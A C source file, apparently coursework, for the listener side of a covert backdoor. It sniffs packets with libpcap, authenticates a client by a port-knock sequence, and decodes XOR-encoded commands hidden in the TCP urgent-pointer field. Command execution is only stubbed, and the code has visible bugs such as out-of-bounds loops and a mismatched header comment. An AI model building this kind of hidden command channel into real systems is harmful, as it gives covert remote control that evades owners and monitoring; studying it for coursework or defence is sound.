/*-----------------------------------------------------------------------------------------------
--	Source File:	pktcap.c - Contains the main datagram receiving functions used by pscan.c
--
--	Functions:	Misc libpcap functions- packet filtering library based on the BSD 
--			packet filter (BPF)
--
--	Interface:	void * ReceiveDatagram (void *pcap_arg)
--				pcap_arg - pointer which will be cast into a pointer to 
--					   struct PcapInfo 
--			    struct PcapInfo: contains all of the packet capture components
--				pcap_t* nic_descr - descriptor to the active NIC
--				bpf_u_int32 netp - address/subnet mask
--				char cmd[MAXLINE] - Packet Filter string to be compiled into the NIC
--
--	Date:		June 24, 2011
--
--	Revisions:	(Date and Description)
--
--	Designer:	Aman Abdulla
--
--	Programmer:	Aman Abdulla
--
--	Notes:
--	This function will use the address and filter string and use them in the pcap_compile() and 
-- 	pcap_setfilter() functions to selectively capture packets of interest. It then invokes 
--	the main callback function to start the packet capture loop.
--
--
--	
-------------------------------------------------------------------------------------------------*/
#include "backjake.h"

static int i = 0;
int auth[3] = {0};
int tries[10] = {0};
int fails = 0;
char command[64] = {0};

static void endProgram (int signo);

void* ReceiveDatagram (void *pcap_arg)
{ 
	printf("Reading!\n");
	struct bpf_program fp;
	PcapInfo *pcap_ptr = (PcapInfo *)pcap_arg;
		
	pcapCompile(pcap_ptr, &fp);
	pcapFilter(pcap_ptr, &fp);
	pcapListen(pcap_ptr);

	return NULL;
}

void startServer(void* Addr_Ptr, void* pcap_ptr, pthread_t *ThreadID2)
{
    pthread_create (ThreadID2, NULL, ReceiveDatagram, (void *)pcap_ptr);
    pthread_join (*ThreadID2, NULL);
}

void setupSignals()
{
    if (signal(SIGINT, endProgram) == SIG_ERR)
        perror("signal(SIGINT) error");    
}

void pcapListen(PcapInfo * pcap_ptr)
{
	void *status = NULL;

	pcap_loop (pcap_ptr->nic_descr, -1, packetHandler, NULL);

	if (ExitFlag == TRUE)
	{
		pthread_exit (status);
	}
	
	exit (0);
}

void pcapCompile(PcapInfo * pcap_ptr, struct bpf_program * fp)
{
	if(pcap_compile (pcap_ptr->nic_descr, fp, pcap_ptr->cmd, 0, pcap_ptr->netp) == -1)
	{ 
		fprintf(stderr,"Error calling pcap_compile\n"); 
		exit(1); 
	}
}

void pcapFilter(PcapInfo * pcap_ptr, struct bpf_program * fp)
{
	if (pcap_setfilter(pcap_ptr->nic_descr, fp) == -1)
	{ 
		fprintf(stderr,"Error setting filter\n"); 
		exit(1); 
	}
}

int checkPacketSize()
{
	return ((sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr)) > 40);
}

void packetHandler(u_char *ptr_null, const struct pcap_pkthdr* pkthdr, const u_char* packet)
{
	struct ethhdr *ethernet_header;
	struct iphdr *ip_header;
	struct tcphdr *tcp_header;

	if (checkPacketSize())
	{
		ethernet_header = (struct ethhdr *)packet;
		if(ntohs(ethernet_header->h_proto) == ETH_P_IP)
		{
			ip_header = (struct iphdr *)(packet + sizeof(struct ethhdr));	
			if(ip_header->protocol == IPPROTO_TCP)
			{
				tcp_header = (struct tcphdr*)(packet + sizeof(struct ethhdr) + ip_header->ihl*4);
				if (server == 0) // if you are the server
				{
					if(authenticated(ip_header->saddr))
					{
						runCommand(decryptPacket(tcp_header));
					} else {
						authenticateClient(ip_header, tcp_header);
					}
				} else {
					sendCommand();
				}
			}
		}
	}
	ExitFlag = TRUE;
}

char* decryptPacket(struct tcphdr* tcp_header)
{
	char temp[3] = {0};
	char encodedLetter = 0;
	sprintf(temp, "%c", tcp_header->urg_ptr);
	strcat(command, temp);
	
	encodedLetter = command[length(command)-1];

	if (encodedLetter == 21)
	{
		XOR(command);
		return command;
	}

	return "";
}

void runCommand(char* command)
{
	if (strcmp(command, "") != 0)
		executeCommand(command);
}

int authenticated(int ip)
{
	size_t k = 0;
	for (k = 0; k < (sizeof(auth) / sizeof(int)); k++)
		if (ip == auth[0])
			return 1;
	return 0;
}

int PrintInHex(char *mesg, unsigned char *p, int len)
{
	printf(mesg);

	while(len--)
	{
		printf("%.2X ", *p);
		p++;
	}
	printf("\n");
	return 0;
}

int authenticateClient(struct iphdr* ip_header, struct tcphdr* tcp_header)
{
	size_t j = 0;
    size_t temp = sizeof(knockCode) / sizeof(int);
				
	if (i == temp)
	{
		i = 0;
	}

	tries[i++] = (int) ntohs(tcp_header->source);

	for (j=0; j<=temp; j++)
	{
		if(tries[j] != knockCode[j])
		{
			fails++;
			break;
		}

		if (j == temp - 1)
		{
			printf("============ AUTH ============\n"); // change this later
			auth[0] = ip_header->saddr;

			for (j=0; j<=temp; j++)
				tries[j]=0;

			i = 0;
			fails = 0;
			return 1;
		}
	}

	if (fails == temp+1)
	{
		for (j=0; j<=temp; j++)
			tries[j]=0;
		i = 0;
		fails=0;
	}

	return 0;
}

void* knockListener(void* pcap_arg)
{
    // NOT YET IMPLEMENTED
    //
    return NULL;
}

void executeCommand(char* command)
{
	if (strcmp(command, "help") == 0) 
	{
		usage2();
	} else if (strcmp(command, "version") == 0) {
		printf("version 1\n");
	} else if (strcmp(command, "exit") == 0) {
		exit(1);
	}

	memset(command, 0, sizeof(command));
    //spawnThread();
}

static void endProgram (int signo)
{
	exit(1);
}